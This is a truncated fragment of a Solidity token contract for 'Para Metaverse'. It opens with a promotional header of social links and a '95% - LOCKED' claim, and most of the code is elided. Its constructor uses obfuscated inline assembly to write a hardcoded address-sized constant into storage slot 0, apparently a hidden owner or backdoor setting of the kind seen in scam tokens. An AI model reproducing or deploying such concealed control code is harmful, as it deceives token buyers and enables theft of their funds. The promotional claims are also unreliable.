/*
Welcome to Para Metaverse Metaverse.

Telegram: https://t.me/ParaMetaverse/
Twitter: https://twitter.com/ParaMetaverse/
Website: https://ParaMetaverse.finance
95% - LOCKED
...
contract ParaMetaverse {
    string public constant name = "Para Metaverse";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(657978166864698692428364007635368855622039666097, 2))}
